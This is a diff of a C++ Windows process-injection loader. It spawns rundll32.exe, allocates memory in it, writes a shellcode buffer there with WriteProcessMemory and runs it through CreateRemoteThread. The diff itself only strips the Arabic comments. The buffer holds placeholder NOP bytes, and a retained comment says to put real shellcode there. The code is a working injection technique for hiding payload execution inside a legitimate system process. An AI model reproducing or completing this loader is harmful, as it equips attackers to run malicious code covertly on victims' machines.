@@ -2,7 +2,6 @@
 #include <tlhelp32.h>
 #include <iostream>
 
-// هنا تضع الشيل كود الخاص بك
 unsigned char shellcode[] = {
     0x90, 0x90, 0x90, 0x90 // مثال: NOP (ضع شيل كود حقيقي)
 };
@@ -24,7 +23,6 @@ int main() {
         return 1;
     }
 
-    // انتظر قليلاً حتى تبدأ العملية
     Sleep(1000);
 
     // خصص ذاكرة في العملية الجديدة
@@ -40,7 +38,6 @@ int main() {
         return 1;
     }
 
-    // اكتب الشيل كود داخل ذاكرة العملية
     if (!WriteProcessMemory(
         pi.hProcess,
         remoteMemory,
@@ -52,7 +49,6 @@ int main() {
         return 1;
     }
 
-    // أنشئ thread لتشغيل الشيل كود
     HANDLE remoteThread = CreateRemoteThread(
         pi.hProcess,
         NULL,
@@ -69,10 +65,8 @@ int main() {
 
     std::cout << "[+] Shellcode executed in rundll32.exe!\n";
 
-    // انتظر انتهاء الـ thread (أو لا حسب السيناريو)
     WaitForSingleObject(remoteThread, INFINITE);
 
-    // تنظيف
     CloseHandle(remoteThread);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
